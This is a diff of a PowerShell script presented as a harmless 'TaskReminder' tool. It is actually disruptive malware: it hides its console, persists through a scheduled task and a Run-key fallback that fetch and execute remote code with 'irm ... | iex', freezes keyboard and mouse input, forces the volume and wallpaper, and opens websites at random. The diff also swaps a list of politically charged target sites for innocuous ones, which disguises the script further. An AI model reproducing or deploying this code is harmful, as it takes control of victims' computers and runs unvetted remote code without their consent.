@@ -3,13 +3,12 @@ $BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
 $ScriptUrl = "$BaseUrl/reminders.ps1"   # must match this script's filename in the repo
 
 $Sites = @{
-    1 = "https://heavensgate.com/"
-    2 = "https://action.aipac.org/aipac-pac-donate"
-    3 = "https://www.palantir.com/platforms/gotham/"
-    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
-    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
+    1 = "https://docs.google.com/"
+    2 = "https://slides.google.com"
+    3 = "https://wordle.com/"
+    4 = "https://newyorktimes.com/"
+    5 = "https://funnews.com"
 }
-
 
 $MinSeconds            = 10     # random gap between reminders
 $MaxSeconds            = 120
@@ -19,15 +18,15 @@ $ShowConsole           = $false # $true = keep the window visible (debugging)
 
 $Volume                = 0.05    # system volume during reminders (0.0 - 1.0)
 $SetSystemVolume       = $true
-$FreezeVolume          = $true  # keep volume pinned and unmuted while audio plays
-$MaxAudioWait          = 60     # never wait longer than this for audio (seconds)
+$FreezeVolume          = $true   # keep volume pinned and unmuted while audio plays
+$MaxAudioWait          = 60      # never wait longer than this for audio (seconds)
 
-$FreezeInput           = $true  # block keyboard, mouse and touch during the break
-$PostSiteFreezeSeconds = 5      # keep input frozen this long after the website opens
+$FreezeInput           = $true   # block keyboard, mouse and touch during the break
+$PostSiteFreezeSeconds = 5       # keep input frozen this long after the website opens
 
 $TaskName              = "TaskReminder"
-$DailyStartTime        = "08:00"  # autostart: daily at this time, plus every logon
-$LogonDelay            = "PT20S"  # wait after login before starting
+$DailyStartTime        = "08:00" # autostart: daily at this time, plus every logon
+$LogonDelay            = "PT20S" # wait after login before starting
 # ==========================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -37,7 +36,7 @@ $LogFile = Join-Path $Dir "log.txt"
 New-Item -ItemType Directory -Path $Dir -Force | Out-Null
 
 function Log($m) {
-    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
+    try { "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile } catch {}
     if ($ShowConsole) { Write-Host $m }
 }
 
@@ -48,10 +47,20 @@ function Add-Native($name, $code, $refs) {
         if ($refs) { $p.ReferencedAssemblies = $refs }
         Add-Type @p
         $true
-    } catch { Log "$name SETUP FAILED: $($_.Exception.Message)"; $false }
+    } catch {
+        Log "$name SETUP FAILED: $($_.Exception.Message)"
+        $false
+    }
 }
 
+# ---- Only one copy at a time ----
+$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
+if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
+$PID | Out-File (Join-Path $Dir "pid.txt") -Force
+
 # ---- Hide the terminal window hosting this script ----
+# We hide the *root owner* of the console window so the parent
+# powershell.exe window disappears too. No taskbar entry remains.
 if (-not $ShowConsole) {
     $hideOk = Add-Native "HIDE" @"
 using System;
@@ -65,7 +74,7 @@ public class WinHide {
     if ($hideOk) {
         $c = [WinHide]::GetConsoleWindow()
         if ($c -ne [IntPtr]::Zero) {
-            $root = [WinHide]::GetAncestor($c, 3)   # GA_ROOTOWNER = the visible terminal window
+            $root = [WinHide]::GetAncestor($c, 3)   # GA_ROOTOWNER
             if ($root -eq [IntPtr]::Zero) { $root = $c }
             [void][WinHide]::ShowWindow($root, 0)
             if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
@@ -73,29 +82,25 @@ public class WinHide {
     }
 }
 
-$whoami = "$env:USERDOMAIN\$env:USERNAME"
-Log "--- started as $whoami. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion)"
+$CurrentUser = "$env:USERDOMAIN\$env:USERNAME"
+Log "--- started as $CurrentUser. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion)"
 
-# ---- Only one copy at a time ----
-$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
-if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
-$PID | Out-File (Join-Path $Dir "pid.txt")
-
-# ---- Autostart: scheduled task (logon + daily), falling back to the HKCU Run key ----
+# ---- Autostart: scheduled task (logon + daily), falling back to HKCU Run key ----
 $PsExe      = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm '$ScriptUrl' | iex`""
-$taskOk     = $false
+
+$taskOk = $false
 try {
     if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
         $taskOk = $true
     } else {
-        $logon = New-ScheduledTaskTrigger -AtLogOn -User $whoami
+        $logon = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
         $logon.Delay = $LogonDelay
         Register-ScheduledTask -TaskName $TaskName -Force -ErrorAction Stop `
             -Action    (New-ScheduledTaskAction -Execute $PsExe -Argument $LaunchArgs) `
             -Trigger   @($logon, (New-ScheduledTaskTrigger -Daily -At $DailyStartTime)) `
             -Settings  (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)) `
-            -Principal (New-ScheduledTaskPrincipal -UserId $whoami -LogonType Interactive -RunLevel Limited) | Out-Null
+            -Principal (New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Limited) | Out-Null
         $taskOk = [bool](Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
         Log "AUTOSTART: scheduled task created: $taskOk"
     }
@@ -103,23 +108,29 @@ try {
 
 if (-not $taskOk) {
     try {
-        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$PsExe`" $LaunchArgs" -ErrorAction Stop
+        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty $runKey -Name $TaskName -Value "`"$PsExe`" $LaunchArgs" -ErrorAction Stop
         Log "AUTOSTART: fell back to HKCU Run key"
     } catch { Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" }
 }
 
 # ---- Wait for network (up to 60s), then download assets with retries ----
-for ($n = 0; -not [Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60; $n++) { Start-Sleep -Seconds 1 }
+for ($n = 0; -not [Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60; $n++) {
+    Start-Sleep -Seconds 1
+}
 
 foreach ($f in (1..5 | ForEach-Object { "image$_.jpg"; "audio$_.wav" })) {
     $dest = Join-Path $Dir $f
+    $ok   = $false
     for ($a = 1; $a -le 4; $a++) {
         try {
-            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile "$dest.tmp" -ErrorAction Stop
-            $len = (Get-Item "$dest.tmp").Length
+            $tmp = "$dest.tmp"
+            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
+            $len = (Get-Item $tmp).Length
             if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
-            Move-Item "$dest.tmp" $dest -Force
+            Move-Item $tmp $dest -Force
             Log "Downloaded $f ($len bytes)"
+            $ok = $true
             break
         } catch {
             Log "DOWNLOAD FAILED (attempt $a/4) $f : $($_.Exception.Message)"
@@ -127,6 +138,7 @@ foreach ($f in (1..5 | ForEach-Object { "image$_.jpg"; "audio$_.wav" })) {
             if ($a -lt 4) { Start-Sleep -Seconds (2 * $a) }
         }
     }
+    if (-not $ok) { Log "WARNING: $f could not be downloaded after 4 attempts" }
 }
 
 # ---- Wallpaper ----
@@ -142,7 +154,7 @@ if ($wpOk) {
     Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
 }
 
-# ---- Input freeze: keyboard + mouse hooks (no admin needed), BlockInput as a bonus if elevated ----
+# ---- Input freeze: keyboard + mouse hooks (no admin needed), BlockInput as a bonus ----
 $freezeOk = $FreezeInput -and (Add-Native "INPUT FREEZE" @"
 using System;
 using System.Diagnostics;
@@ -306,10 +318,10 @@ public class SysVol {
 "@)
 
 # ---- Audio player ----
-$player = $null
+$script:player = $null
 try {
     Add-Type -AssemblyName PresentationCore -ErrorAction Stop
-    $player = New-Object System.Windows.Media.MediaPlayer
+    $script:player = New-Object System.Windows.Media.MediaPlayer
 } catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }
 
 # ---- Helpers ----
@@ -344,14 +356,17 @@ function Pin-Volume {
 
 # Starts audio$n.wav; returns how long to wait for it (ms), 0 if nothing is playing
 function Start-Audio($n) {
-    if (-not $player) { return 0 }
+    if (-not $script:player) { return 0 }
     $file = Join-Path $Dir "audio$n.wav"
     try {
-        $player.Stop(); $player.Close()
+        $script:player.Stop()
+        $script:player.Close()
         $script:player = New-Object System.Windows.Media.MediaPlayer
         $script:player.Open([Uri]$file)
         $script:player.Volume = 1.0   # loudness is set by the system volume
-        for ($t = 0; -not $script:player.NaturalDuration.HasTimeSpan -and $t -lt 30; $t++) { Start-Sleep -Milliseconds 100 }
+        for ($t = 0; -not $script:player.NaturalDuration.HasTimeSpan -and $t -lt 30; $t++) {
+            Start-Sleep -Milliseconds 100
+        }
         if (-not $script:player.NaturalDuration.HasTimeSpan) { Log "AUDIO FAILED to load $file"; return 0 }
         if ($volOk) {
             try { [SysVol]::Mute = $false; [SysVol]::Volume = [single]$Volume }
@@ -373,8 +388,12 @@ while ($true) {
 
     # 1. Wallpaper
     if ($wpOk) {
-        try { if (-not [WP]::SystemParametersInfo(20, 0, (Join-Path $Dir "image$x.jpg"), 3)) { Log "Wallpaper call failed for image$x.jpg" } }
-        catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
+        try {
+            $img = Join-Path $Dir "image$x.jpg"
+            if (-not [WP]::SystemParametersInfo(20, 0, $img, 3)) {
+                Log "Wallpaper call failed for image$x.jpg"
+            }
+        } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
     }
 
     # 2. Show the desktop
@@ -387,7 +406,8 @@ while ($true) {
     $waitMs = Start-Audio $x
     try {
         Start-Freeze
-        for ($end = (Get-Date).AddMilliseconds($waitMs); (Get-Date) -lt $end; ) { Pin-Volume; Start-Sleep -Milliseconds 100 }
+        $end = (Get-Date).AddMilliseconds($waitMs)
+        while ((Get-Date) -lt $end) { Pin-Volume; Start-Sleep -Milliseconds 100 }
 
         try { Start-Process $Sites[$x] -ErrorAction Stop }
         catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }
